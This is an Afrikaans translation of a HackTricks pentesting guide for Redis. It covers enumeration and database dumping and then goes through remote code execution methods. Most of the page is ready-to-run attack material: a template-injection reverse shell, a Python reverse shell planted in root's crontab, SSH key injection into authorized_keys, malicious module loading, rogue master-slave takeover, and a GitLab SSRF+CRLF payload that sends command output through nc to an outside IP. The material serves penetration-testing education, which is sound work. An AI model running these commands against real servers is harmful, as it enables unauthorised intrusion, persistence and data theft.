# 6379 - Pentesting Redis

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/image (3).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!

**Hacking Inligting**\
Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek

**Regte-Tyd Hack Nuus**\
Bly op hoogte van die vinnig bewegende hacking wêreld deur regte-tyd nuus en insigte

**Laaste Aankondigings**\
Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## Basiese Inligting

Van [the docs](https://redis.io/topics/introduction): Redis is 'n oopbron (BSD gelisensieerde), in-geheue **data struktuur stoor**, gebruik as 'n **databasis**, cache en boodskap broker).

Standaard gebruik Redis 'n teksgebaseerde protokol, maar jy moet in gedagte hou dat dit ook **ssl/tls** kan implementeer. Leer hoe om [Redis met ssl/tls te laat loop hier](https://fossies.org/linux/redis/TLS.md).

**Standaard poort:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Outomatiese Enumerasie

Sommige outomatiese gereedskap wat kan help om inligting van 'n redis-instansie te verkry:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Handmatige Enumerasie

### Banner

Redis is 'n **tekstgebaseerde protokol**, jy kan net **die opdrag in 'n soket stuur** en die teruggegee waardes sal leesbaar wees. Onthou ook dat Redis kan loop met **ssl/tls** (maar dit is baie vreemd).

In 'n gewone Redis-instansie kan jy net aansluit met `nc` of jy kan ook `redis-cli` gebruik:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
Die **eerste opdrag** wat jy kan probeer is **`info`**. Dit **kan 'n uitvoer met inligting** van die Redis-instansie **of iets** soos die volgende teruggee:
```
-NOAUTH Authentication required.
```
In hierdie laaste geval beteken dit dat **jy geldige geloofsbriewe nodig het** om toegang tot die Redis-instansie te verkry.

### Redis Outentisering

**Standaard** kan Redis **sonder geloofsbriewe** benader word. Dit kan egter **gekonfigureer** word om **slegs wagwoord, of gebruikersnaam + wagwoord** te ondersteun.\
Dit is moontlik om 'n **wagwoord** in die _**redis.conf**_ lêer met die parameter `requirepass` **of tydelik** in te stel totdat die diens herbegin word deur dit te verbind en die volgende uit te voer: `config set requirepass p@ss$12E45`.\
Ook kan 'n **gebruikersnaam** in die parameter `masteruser` binne die _**redis.conf**_ lêer geconfigureer word.

> [!NOTE]
> As slegs 'n wagwoord geconfigureer is, is die gebruikersnaam wat gebruik word "**default**".\
> Let ook daarop dat daar **geen manier is om van buite af te vind** of Redis slegs met 'n wagwoord of gebruikersnaam + wagwoord geconfigureer is nie.

In gevalle soos hierdie sal jy **geldige geloofsbriewe moet vind** om met Redis te kommunikeer, sodat jy kan probeer om dit [**brute-force**](../generic-hacking/brute-force.md#redis) te doen.\
**As jy geldige geloofsbriewe gevind het, moet jy die sessie outentiseer** nadat jy die verbinding met die opdrag gevestig het:
```bash
AUTH <username> <password>
```
**Geldige geloofsbriewe** sal geantwoord word met: `+OK`

### **Geoutentiseerde opsporing**

As die Redis-bediener **anonieme verbindings** toelaat of as jy geldige geloofsbriewe verkry het, kan jy die opsporingsproses vir die diens begin met die volgende **opdragte**:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**Ander Redis-opdragte** [**kan hier gevind word**](https://redis.io/topics/data-types-intro) **en** [**hier**](https://lzone.de/cheat-sheet/Redis)**.**

Let daarop dat die **Redis-opdragte van 'n instansie hernoem** of verwyder kan word in die _redis.conf_ lêer. Byvoorbeeld, hierdie lyn sal die opdrag FLUSHDB verwyder:
```
rename-command FLUSHDB ""
```
Meer oor die veilige konfigurasie van 'n Redis-diens hier: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

Jy kan ook **in werklike tyd die Redis-opdragte** monitor wat uitgevoer word met die opdrag **`monitor`** of die top **25 stadigste navrae** kry met **`slowlog get 25`**

Vind meer interessante inligting oor meer Redis-opdragte hier: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Databasis Dump**

Binne Redis is die **databasisse nommers wat vanaf 0 begin**. Jy kan vind of enige gebruik word in die uitvoer van die opdrag `info` binne die "Keyspace" stuk:

![](<../images/image (766).png>)

Of jy kan net al die **keyspaces** (databasisse) kry met:
```
INFO keyspace
```
In daardie voorbeeld word die **databasis 0 en 1** gebruik. **Databasis 0 bevat 4 sleutels en databasis 1 bevat 1**. Standaard sal Redis databasis 0 gebruik. Om byvoorbeeld databasis 1 te dump, moet jy doen:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
In die geval dat jy die volgende fout kry `-WRONGTYPE Operation against a key holding the wrong kind of value` terwyl jy `GET <KEY>` uitvoer, is dit omdat die sleutel dalk iets anders as 'n string of 'n heelgetal is en 'n spesiale operator benodig om dit te vertoon.

Om die tipe van die sleutel te ken, gebruik die `TYPE` opdrag, voorbeeld hieronder vir lys en hash sleutels.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**Dump die databasis met npm** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **of python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../images/image (3).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en bug bounty jagters!

**Hacking Inligting**\
Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek

**Regte Tyd Hack Nuus**\
Bly op hoogte van die vinnig bewegende hacking wêreld deur regte tyd nuus en insigte

**Laaste Aankondigings**\
Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

## Redis RCE

### Interaktiewe Skil

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) kan outomaties 'n interaktiewe skil of 'n omgekeerde skil in Redis(<=5.0.5) verkry.
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

Inligting van [**hier**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). Jy moet die **pad** van die **Webwerf-gids** weet:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
As die webshell toegang uitsondering, kan jy die databasis leegmaak na 'n rugsteun en weer probeer, onthou om die databasis te herstel.

### Sjabloon Webshell

Soos in die vorige afdeling kan jy ook 'n paar html-sjabloonlêers oorskryf wat deur 'n sjabloon enjin geïnterpreteer gaan word en 'n shell verkry.

Byvoorbeeld, volg [**hierdie skrywe**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), jy kan sien dat die aanvaller 'n **rev shell in 'n html** geïnterpreteer deur die **nunjucks sjabloon enjin** ingespuit het:
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
> [!WARNING]
> Let daarop dat **verskeie sjabloon enjin** die sjablone in **geheue** kas, so selfs al oorskryf jy hulle, sal die nuwe een **nie uitgevoer word** nie. In hierdie gevalle het die ontwikkelaar of die outomatiese herlaai aktief gelaat of jy moet 'n DoS oor die diens doen (en verwag dat dit outomaties herbegin sal word).

### SSH

Voorbeeld [van hier](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

Wees asseblief bewus dat die **`config get dir`** resultaat verander kan word na ander handmatige ontploffingsopdragte. Dit word voorgestel om dit eerste te loop reg na aanmelding in Redis. In die uitvoer van **`config get dir`** kan jy die **huis** van die **redis gebruiker** vind (gewoonlik _/var/lib/redis_ of _/home/redis/.ssh_), en as jy dit weet, weet jy waar jy die `authenticated_users` lêer kan skryf om via ssh **met die gebruiker redis** toegang te verkry. As jy die huis van 'n ander geldige gebruiker weet waar jy skryfrechten het, kan jy dit ook misbruik:

1. Genereer 'n ssh publieke-private sleutel paar op jou pc: **`ssh-keygen -t rsa`**
2. Skryf die publieke sleutel na 'n lêer : **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Importeer die lêer in redis : **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Stoor die publieke sleutel in die **authorized_keys** lêer op die redis bediener:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

5. Laastens, kan jy **ssh** na die **redis bediener** met private sleutel : **ssh -i id_rsa redis@10.85.0.52**

**Hierdie tegniek is geoutomatiseer hier:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
Die laaste voorbeeld is vir Ubuntu, vir **Centos**, die bogenoemde opdrag moet wees: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

Hierdie metode kan ook gebruik word om bitcoin te verdien ：[yam](https://www.v2ex.com/t/286981#reply14)

### Laai Redis Module

1. Volg die instruksies van [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) jy kan **'n redis module saamstel om arbitrêre opdragte uit te voer**.
2. Dan het jy 'n manier nodig om die **saamgestelde** module **op te laai**.
3. **Laai die opgelaaide module** tydens uitvoering met `MODULE LOAD /path/to/mymodule.so`
4. **Lys gelaaide modules** om te kontroleer of dit korrek gelaai is: `MODULE LIST`
5. **Voer** **opdragte** uit:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```

6. Laai die module af wanneer jy wil: `MODULE UNLOAD mymodule`

### LUA sandbox omseiling

[**Hier**](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) kan jy sien dat Redis die opdrag **EVAL** gebruik om **Lua kode in 'n sandbox** uit te voer. In die gekoppelde pos kan jy sien **hoe om dit te misbruik** met die **dofile** funksie, maar [klaarblyklik](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) is dit nie meer moontlik nie. Hoe dit ook al sy, as jy die **Lua** sandbox kan **omseil**, kan jy **arbitrêre** opdragte op die stelsel uitvoer. Ook, uit dieselfde pos kan jy 'n paar **opsies sien om DoS te veroorsaak**.

Sommige **CVEs om van LUA te ontsnap**:

- [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### Meester-Slaaf Module

Die meester redis sinchroniseer alle operasies outomaties na die slaaf redis, wat beteken dat ons die kwesbaarheid redis as 'n slaaf redis kan beskou, gekoppel aan die meester redis wat ons eie beheer is, dan kan ons die opdragte na ons eie redis invoer.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF wat met Redis praat

As jy **duidelike teks** versoeke **na Redis** kan stuur, kan jy **met dit kommunikeer** aangesien Redis die versoek lyn vir lyn sal lees en net met foute op die lyne sal antwoordgee wat dit nie verstaan nie:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Daarom, as jy 'n **SSRF vuln** in 'n webwerf vind en jy kan **beheer** oor sommige **headers** (miskien met 'n CRLF vuln) of **POST parameters**, sal jy in staat wees om arbitrêre opdragte na Redis te stuur.

### Voorbeeld: Gitlab SSRF + CRLF na Shell

In **Gitlab11.4.7** is 'n **SSRF** kwesbaarheid en 'n **CRLF** ontdek. Die **SSRF** kwesbaarheid was in die **import project from URL functionality** wanneer 'n nuwe projek geskep word en het toegang tot arbitrêre IP's in die vorm \[0:0:0:0:0:ffff:127.0.0.1] toegelaat (dit sal 127.0.0.1 benader), en die **CRLF** vuln is net **deur %0D%0A** karakters by die **URL** te voeg, uitgebuit.

Daarom was dit moontlik om **hierdie kwesbaarhede te misbruik om met die Redis-instansie te praat** wat **queues** van **gitlab** bestuur en daardie queues te misbruik om **kode-uitvoering te verkry**. Die Redis queue misbruik payload is:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
En die **URL encode** versoek **misbruik van SSRF** en **CRLF** om 'n `whoami` uit te voer en die uitvoer terug te stuur via `nc` is:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Om een of ander rede (soos vir die skrywer van_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _waar hierdie inligting vandaan kom) het die uitbuiting gewerk met die `git` skema en nie met die `http` skema nie._

<figure><img src="../images/image (3).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en bug bounty jagters!

**Hacking Inligting**\
Betrek jouself met inhoud wat die opwinding en uitdagings van hacking ondersoek

**Regte Tyd Hack Nuus**\
Bly op hoogte van die vinnig bewegende hacking wêreld deur middel van regte tyd nuus en insigte

**Laaste Aankondigings**\
Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings

**Sluit by ons aan op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

{{#include ../banners/hacktricks-training.md}}
